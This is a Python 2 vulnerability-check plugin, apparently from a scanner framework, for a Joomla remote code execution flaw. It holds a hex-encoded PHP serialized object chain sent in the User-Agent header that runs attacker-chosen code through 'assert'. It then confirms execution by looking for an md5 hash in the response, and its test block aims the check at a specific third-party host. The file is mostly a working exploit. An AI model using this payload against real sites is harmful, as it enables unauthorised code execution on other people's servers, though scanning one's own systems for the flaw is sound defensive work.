from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
#-*- coding:utf-8 -*-
import re
import binascii


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        poc = arg 
        payload = '7d5f5f746573747c4f3a32313a224a44617461626173654472697665724d7973716c69223a333a7b733a323a226663223b4f3a31373a224a53696d706c65706965466163746f7279223a303a7b7d733a32313a225c305c305c30646973636f6e6e65637448616e646c657273223b613a313a7b693a303b613a323a7b693a303b4f3a393a2253696d706c65506965223a353a7b733a383a2273616e6974697a65223b4f3a32303a224a44617461626173654472697665724d7973716c223a303a7b7d733a383a22666565645f75726c223b733a34343a22646965286d64352832333333333329293b4a466163746f72793a3a676574436f6e66696728293b657869743b223b733a31393a2263616368655f6e616d655f66756e6374696f6e223b733a363a22617373657274223b733a353a226361636865223b623a313b733a31313a2263616368655f636c617373223b4f3a32303a224a44617461626173654472697665724d7973716c223a303a7b7d7d693a313b733a343a22696e6974223b7d7d733a31333a225c305c305c30636f6e6e656374696f6e223b623a313b7df0'
        ua = binascii.unhexlify(payload)
        code, head, res, errcode, _ = curl.curl2(poc,user_agent=ua)
        if code != 200:
            return False
        patten = re.findall(r'Set-Cookie: (?P<aa>.*); p',head)
        cookie = patten[0]
        code, head, res, errcode, _ = curl.curl2(poc,cookie=cookie)
        if 'fb0b32aeafac4591c7ae6d5e58308344' in res:
            output("Joomla has vul, please upgrade:"+poc,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_c7f0f9c28bc350ed0e9d99a9445b27df.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_c7f0f9c28bc350ed0e9d99a9445b27df.py
#/root/github/poccreate/codesrc/exp-1894.py